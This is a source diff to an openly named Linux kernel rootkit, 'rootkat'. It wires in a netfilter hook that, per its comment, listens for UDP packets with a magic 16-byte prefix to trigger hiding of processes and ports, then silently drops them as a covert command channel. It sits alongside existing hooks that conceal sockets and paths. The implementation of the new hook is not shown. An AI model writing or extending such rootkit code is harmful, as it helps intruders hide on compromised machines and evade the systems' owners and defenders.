@@ -16,6 +16,7 @@
 #include "hook_unix_seq_show.h"
 #include "hook_unix_diag.h"
 #include "hook_io_issue_sqe.h"
+#include "hook_netfilter.h"
 #include "hidden_unix_paths.h"
 
 #define ROOTKAT_TAG "rootkat: "
@@ -141,12 +142,22 @@ static int __init rootkat_init(void)
 		pr_warn(ROOTKAT_TAG "io_issue_sqe hook failed: %d (io_uring covert channel down)\n",
 		        rc);
 
+	/* Non-fatal: netfilter PRE_ROUTING hook. Inbound UDP packets with
+	 * a magic 16-byte payload prefix trigger hide-pid/hide-port without
+	 * needing a listening socket on this host — the rootkit hears the
+	 * command at the network layer and silently drops the packet. */
+	rc = rootkat_hook_netfilter_install();
+	if (rc)
+		pr_warn(ROOTKAT_TAG "netfilter hook failed: %d (network covert channel down)\n",
+		        rc);
+
 	pr_info(ROOTKAT_TAG "loaded (hidden)\n");
 	return 0;
 }
 
 static void __exit rootkat_exit(void)
 {
+	rootkat_hook_netfilter_remove();
 	rootkat_hook_io_issue_sqe_remove();
 	rootkat_hook_unix_diag_remove();
 	rootkat_hook_unix_seq_show_remove();
